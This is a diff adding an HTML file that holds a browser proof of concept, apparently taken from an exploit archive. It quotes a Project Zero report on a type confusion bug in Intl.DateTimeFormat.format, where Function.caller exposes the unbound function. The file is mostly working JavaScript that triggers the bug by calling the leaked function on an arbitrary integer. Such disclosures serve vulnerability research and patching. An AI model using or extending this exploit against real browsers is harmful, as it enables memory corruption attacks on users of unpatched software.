@@ -1,0 +1,56 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1036
+
+There is a type confusion vulnerability when calling DateTimeFormat.format. This function is provided as a bound function by a getter in the DateTimeFormat class. Binding the function ensures that the this object is of the right type. However, when the bound function is called, it calls into user script when converting the date parameter, which can call Function.caller, obtaining the unbound function. This type unsafe function can then be called on any type.
+
+A minimal PoC is as follows, and a full PoC is attached. 
+
+
+var i = new Intl.DateTimeFormat();
+var q;
+
+function f(){
+	q = f.caller;
+	return 10;
+}
+
+
+i.format({valueOf : f});
+
+q.call(0x77777777);
+-->
+
+<html>
+<body>
+<script>
+
+var date = new Date(Date.UTC(2012, 11, 20, 3, 0, 0));
+
+var i = new Intl.DateTimeFormat();
+
+//print(i);
+
+var q;
+
+function f(){
+
+	//print("in f");
+	//print(f.caller);
+	q = f.caller;
+	return 10;
+}
+
+try{
+i.format({valueOf : f});
+}catch(e){
+
+	//print("problem");
+
+}
+
+//print(q);
+q.call(0x77777777);
+
+</script>
+</body>
+</html>
